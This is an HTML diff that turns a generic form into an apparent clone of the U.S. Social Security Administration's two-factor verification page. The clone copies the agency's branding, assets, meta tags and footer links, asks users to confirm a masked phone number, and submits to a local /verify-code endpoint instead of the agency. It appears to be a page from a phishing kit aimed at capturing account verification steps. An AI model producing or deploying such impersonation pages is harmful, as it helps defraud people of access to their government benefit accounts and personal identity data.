@@ -1,96 +1,189 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body {font-family: Arial, Helvetica, sans-serif;}
-form {border: 3px solid #f1f1f1;}
-
-input[type=text], input[type=password] {
-    width: 100%;
-    padding: 12px 20px;
-    margin: 8px 0;
-    display: inline-block;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
-}
-
-button {
-    background-color: #4CAF50;
-    color: white;
-    padding: 14px 20px;
-    margin: 8px 0;
-    border: none;
-    cursor: pointer;
-    width: 100%;
-}
-
-button:hover {
-    opacity: 0.8;
-}
-
-.cancelbtn {
-    width: auto;
-    padding: 10px 18px;
-    background-color: #f44336;
-}
-  
-.nextbtn {
-    width: auto;
-    padding: 10px 18px;
-    background-color: #008000;
-}
-
-.imgcontainer {
-    text-align: center;
-    margin: 24px 0 12px 0;
-}
-
-img.avatar {
-    width: 40%;
-    border-radius: 50%;
-}
-
-.container {
-    padding: 16px;
-}
-
-span.psw {
-    float: right;
-    padding-top: 16px;
-}
-
-/* Change styles for span and cancel button on extra small screens */
-@media screen and (max-width: 300px) {
-    span.psw {
-       display: block;
-       float: none;
-    }
-    .cancelbtn {
-       width: 100%;
-    }
-}
-</style>
-</head>
-<body>
-  
-<h2>Please verify your cell phone number</h2>
-  
-<form action="/verify-code">
-<div class="container">
-  <p>
-    <b>Is your cell phone number still (***) *** - 9414?</b>
-  </p>
-  <p>
-      <input type="radio" name="phone" value="correct" checked> Yes, it is correct. Please provide a security code now.<br>
-      <input type="radio" name="phone" value="wrong"> No, it is no longer valid and must be changed.<br>
-  </p>
-</div>
-  
-  <div class="container" style="background-color:#f1f1f1">
-    <button type="submit" class="nextbtn">Next</button>
-    <button type="button" class="cancelbtn">Exit</button>
-  </div>
-</form>
-</body>
-</html>
+<!doctype html>
+	<html id="Vcpn" data-ssa-page-id="Vcpn" lang="en">
+	
+	<head>
+	<meta name="checkpointVersion" content="1.0.0-SNAPSHOT" />
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="env" content="prd" />
+	<meta name="application-name" content="EA-Login" />
+	<meta name="description" content="Verify-Second-Factor-Information" />
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="Pragma" content="no-cache" />
+	<meta http-equiv="expires" content="-1" />
+	<meta http-equiv="expires" content="0" />
+	<meta http-equiv="Cache-Control" content="no-store" />
+	<meta http-equiv="Cache-Control" content="no-cache" />
+	<meta http-equiv="Cache-Control" content="must-revalidate" />
+	<meta http-equiv="Cache-Control" content="proxy-revalidate" />
+	<meta http-equiv="Cache-Control" content="max-age=0" />
+	
+	<title>Social Security</title>
+	
+	<style>
+	@import url(https://www.socialsecurity.gov/flexweb/rel_5_0/css/import.css);
+	</style>
+	<style type="text/css">@import url(styles/appStyles.css);</style>
+	
+	<script src="https://www.socialsecurity.gov/flexweb/rel_5_0/libs/jquery/jquery.min.js"></script>
+	<script src="https://www.socialsecurity.gov/flexweb/rel_5_0/js/ssa.namespace.js"></script>
+	<script>
+	SSA.deployment.setURL("https://www.socialsecurity.gov/flexweb/rel_5_0/");
+	</script>
+	<script src="https://www.socialsecurity.gov/flexweb/rel_5_0/js/ssa.fn.setup.js"></script>
+	<script src="https://www.socialsecurity.gov/flexweb/rel_5_0/libs/headjs/head.min.js" data-headjs-load="https://www.socialsecurity.gov/flexweb/rel_5_0/js/ssa.flexweb.loader.js"></script>
+	<script src="https://www.socialsecurity.gov/flexweb/analytics/ssa.analytics.js"></script>
+	
+	<script type="text/javascript">
+	/*<![CDATA[*/
+	document.cookie = "IV_JCT=%2FRIL; path=/; secure";
+	/*]]>*/
+	</script>
+	</head>
+	<body class="uef-theme-std" data-uef-disable-page-exit="true" data-uef-disable-page-timeout="true">
+	<header>
+	<div id="uef-tmpl-header" role="banner">
+	<a id="uef-tmpl-skipNav" href="#uef-tmpl-content" accesskey="K">Skip to Content</a>
+	<div id="uef-tmpl-logo">
+	</div>
+	<div id="uef-tmpl-websiteTitle">
+	<h1>Social Security</h1></div>
+	<div id="uef-tmpl-global">
+	<div id="uef-tmpl-global-options">
+	</div>
+	</div>
+	</div>
+	</header>
+	
+	<noscript>
+	<div id="uef-tmpl-javaScriptOff">
+	<div class="uef-grids-row">
+	<div class="uef-grids-column-3-4 uef-grids-column ">
+	<div class="uef-grids-content">
+	<div class="uef-warning uef-notice">
+	
+	<div class="uef-notice-row hd">
+	<div class="uef-notice-content">
+	<h4 tabindex="0">
+	JavaScript is required to use this service</h4></div>
+	</div>
+	
+	<div class="uef-notice-row">
+	<div class="uef-notice-content">
+	
+	<p>Social Security's online services are designed to be accessible and user-friendly. That is why we require all web browsers to have JavaScript enabled when working with our online services.</p>
+	<p>To use this service, please adjust your web browser settings to enable JavaScript, then <a href="/RIL/VcpnView.action">try again</a>.</p>
+	<p>If you can't or don't want to enable JavaScript, you can return to the <a href="http://www.socialsecurity.gov/">Social Security home page</a>.</p>
+	</div>
+	</div>
+	
+	
+	</div>
+	
+	</div>
+	</div>
+	</div>
+	</div>
+	</noscript>
+	<div id="uef-tmpl-content-wrapper" class="hide">
+	<script>
+	var jsOffMsg = document.getElementById("fw-JavaScriptOff");
+	if(jsOffMsg) {jsOffMsg.parentNode.removeChild(jsOffMsg);}
+	var mainSection = document.getElementById("uef-tmpl-content-wrapper");
+	if(mainSection){$(mainSection).removeClass("hide");}
+	</script>
+	<div id="uef-tmpl-content" role="main">
+	
+	<form id="Vcpn" name="Vcpn" action="/verify-code">
+	<input type="hidden" name="struts.token.name" value="Vcpn_Rome_Token" />
+	<input type="hidden" name="Vcpn_Rome_Token" value="DYOLKG192WNQXGGZ00XVIY14L4JJ3L3I" />
+	
+	
+	
+	<div class="uef-container module">
+	
+	<div class="uef-container-row hd uef-container-separator">
+	<div class="uef-container-content">
+	<h3 tabindex="0">
+	Please verify your cell phone number</h3></div>
+	</div>
+	
+	<div class="uef-container-row">
+	<div class="uef-container-content">
+	
+	
+	<fieldset class="uef-input-compound">
+	
+	<div class="uef-radioList uef-input" data-uefID="uef-in-rdoLst">
+	<fieldset>
+	<div class="uef-pattern-label">
+	<div class="legend"><span id="uef-radioList1PatternLabel">
+	Is your cell phone number still (***) *** - 9414?
+	</span></div>
+	</div>
+	<div class="uef-pattern-content">
+	
+	<ol class="uef-inputList">
+	
+	<li>
+	<input type="radio" name="sfType" id="sftype" value="sfSMS" aria-labelledby="uef-radioList1PatternLabel sftypeLabel"/><label for="sftype" id="sftypeLabel">
+	Yes, it is correct. Please provide a security code now.
+	</label>
+	</li>
+	
+	<li>
+	<input type="radio" name="sfType" id="sftype_2" value="sfNew" aria-labelledby="sftype_2Label"/><label for="sftype_2" id="sftype_2Label">
+	No, it is no longer valid and must be changed.
+	</label>
+	</li>
+	
+	
+	</ol>
+	
+	</div>
+	</fieldset>
+	</div>
+	
+	</fieldset>
+	
+	
+	</div>
+	</div>
+	
+	
+	</div>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<div class="uef-formControls" id="bottom">
+	<input type="submit" value="Next" name="submit"
+	id="submit" class="uef-btn uef-btn-primary"/>
+	
+	<input type="submit" value="Exit" name="exit"
+	id="exit" class="uef-btn"/>
+	
+	</div>
+	
+	</form>
+	
+	
+	
+	
+	
+	</div>
+	<div id="uef-tmpl-footer" role="contentinfo"><a href="../RIR/HpsView.action" target="_blank">Privacy and Security</a><ul><li><a id="uef-tmpl-paperworkReduction" href="http://www.socialsecurity.gov/pr-act/pra-myssa.htm" target="_blank">OMB No. 0960-0789</a></li><li><a id="uef-tmpl-privacyPolicy" href="http://www.socialsecurity.gov/agency/privacy.html" target="_blank">Privacy Policy</a></li><li><a id="uef-tmpl-privacyAct" href="../RIR/HpasView.action" target="_blank">Privacy Act Statement</a></li><li><a id="uef-tmpl-accessibility" href="http://www.socialsecurity.gov/accessibility/" target="_blank">Accessibility Help</a></li></ul></div>
+	</div>
+	</body>
+	</html>
+	
+	
+	
